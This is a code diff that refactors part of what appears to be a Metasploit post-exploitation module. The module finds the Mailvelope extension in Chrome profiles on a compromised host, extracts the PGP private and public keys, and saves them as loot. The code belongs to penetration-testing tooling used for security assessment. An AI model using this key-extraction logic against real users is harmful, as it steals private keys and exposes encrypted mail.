@@ -40,7 +40,11 @@ class Metasploit3 < Msf::Post
 			], self.class)
 	end
 
-	def extension_parse_mailvelope(username, extname)
+	def extension_mailvelope_parse_key(data)
+		return data.gsub("\x00","").tr("[]","").gsub("\\r","").gsub("\"","").gsub("\\n","\n")
+	end
+
+	def extension_mailvelope(username, extname)
 		chrome_path = @profiles_path + "\\" + username + @data_path
 		maildb_path = chrome_path + "/Local Storage/chrome-extension_#{extname}_0.localstorage"
 		begin
@@ -64,7 +68,7 @@ class Metasploit3 < Msf::Post
 				keys = res["value"].split(",")
 				print_good("==> Found #{keys.size} private key(s)!")
 				keys.each do |key|
-					privkey = key.split("\x00").join.tr("[]","").split("\\r").join.split("\"").join.split("\\n").join("\n")
+					privkey = extension_mailvelope_parse_key(key)
 					vprint_good(privkey)
 					path = store_loot("chrome.mailvelope.privkey", "text/plain", session, privkey, "privkey.key", "Mailvelope PGP Private Key")
 					print_status("==> Saving private key to: #{path}")
@@ -74,7 +78,7 @@ class Metasploit3 < Msf::Post
 				keys = res["value"].split(",")
 				print_good("==> Found #{keys.size} public key(s)!")
 				keys.each do |key|
-					pubkey = key.split("\x00").join.tr("[]","").split("\\r").join.split("\"").join.split("\\n").join("\n")
+					pubkey = extension_mailvelope_parse_key(key)
 					vprint_good(pubkey)
 					path = store_loot("chrome.mailvelope.pubkey", "text/plain", session, pubkey, "pubkey.key", "Mailvelope PGP Public Key")
 					print_status("==> Saving public key to: #{path}")
@@ -97,7 +101,7 @@ class Metasploit3 < Msf::Post
 				print_status("=> #{values['manifest']['name']}")
 				if values['manifest']['name'] =~ /mailvelope/i
 					print_good("==> Found Mailvelope extension, extracting PGP keys")
-					extension_parse_mailvelope(username, name)
+					extension_mailvelope(username, name)
 				end
 			end
 		end
